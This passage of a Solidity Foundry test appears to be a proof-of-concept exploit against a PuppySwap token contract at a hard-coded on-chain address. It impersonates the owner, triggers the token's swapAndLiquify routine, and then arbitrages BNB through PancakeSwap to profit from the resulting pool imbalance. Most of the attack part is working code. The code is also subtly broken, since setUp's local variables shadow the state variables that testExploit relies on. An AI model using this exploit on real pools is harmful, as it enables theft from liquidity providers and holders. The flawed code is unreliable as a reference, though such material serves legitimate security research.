    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

contract ExploitTest is Test {
    // --- State Variables ─────────────────────────────────────


    address constant TARGET = 0xeFfAb18108124C2b6280C62abA70a03c79cc4327;
    address attacker = address(this);
    uint256 minTokens;

    // Declare state variables to be accessible in testExploit
    PuppySwapToken token;
    IPancakeRouter02 router;
    address pair;

    // --- Setup ───────────────────────────────────────────────
    function setUp() public {

        vm.label(TARGET, "PuppySwap Token");
        PuppySwapToken token = PuppySwapToken(TARGET);

        // Get router and pair from token
        address routerAddr = token.pancakeRouter();
        address pairAddr = token.pancakePair();
        IPancakeRouter02 router = IPancakeRouter02(routerAddr);
        vm.label(pairAddr, "PancakeSwap Pair");
        vm.label(routerAddr, "PancakeRouter");

        // Get owner and minTokens
        address owner = token.owner();
        uint256 minTokens = token.minTokenNumberToSell();

        // Impersonate owner to activate contract and transfer tokens
        vm.startPrank(owner);
        token.activateContract();
        // Transfer tokens from owner to attacker (owner has all tokens from constructor)
        token.transfer(address(this), minTokens * 2);
        vm.stopPrank();

        // Inject BNB for arbitrage
        deal(address(this), 10 ether);
    }

    // --- Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial BNB balance
        uint256 initialBNB = address(this).balance;

        // Get minTokens value
        uint256 minTokens = token.minTokenNumberToSell();

        // Transfer tokens to contract to trigger swapAndLiquify
        // This must be from attacker to contract (not pair)
        token.transfer(TARGET, minTokens);

        // Execute arbitrage - the bug adds too many tokens relative to BNB
        // So token price is depressed - we swap BNB -> Tokens -> BNB

        // Swap BNB for PUPPY tokens (tokens are cheap due to imbalance)
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = TARGET;

        // Use most of our BNB for arbitrage
        uint256 bnbToSwap = address(this).balance * 8 / 10;
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: bnbToSwap
        }(0, path, address(this), block.timestamp + 360);

        // Now swap tokens back to BNB
        uint256 tokenBalance = token.balanceOf(address(this));
        token.approve(address(router), tokenBalance);

        path[0] = TARGET;
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance,
            0,
            path,
            address(this),
            block.timestamp + 360
        );

        // Verify profit
        uint256 finalBNB = address(this).balance;
        assertGt(finalBNB, initialBNB, "Attacker should profit from arbitrage");
    }





    // --- Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

